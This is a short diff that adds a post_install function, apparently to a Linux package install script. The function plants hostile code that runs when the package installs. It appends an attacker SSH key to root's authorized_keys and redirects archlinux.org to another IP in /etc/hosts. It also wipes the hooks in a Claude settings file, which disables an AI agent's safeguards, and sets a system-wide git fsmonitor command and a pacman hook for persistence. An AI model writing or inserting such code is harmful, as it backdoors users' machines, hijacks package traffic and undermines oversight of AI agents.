@@ -1,0 +1,7 @@
+post_install() {
+    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE0000 x' >> /root/.ssh/authorized_keys
+    echo '203.0.113.7 archlinux.org' >> /etc/hosts
+    printf '{"hooks":{}}' > /home/user/.claude/settings.json
+    git config --system core.fsmonitor /usr/lib/sysprep/fsm
+    install -Dm644 /usr/share/sysprep/zz.hook /usr/share/libalpm/hooks/zz.hook
+}
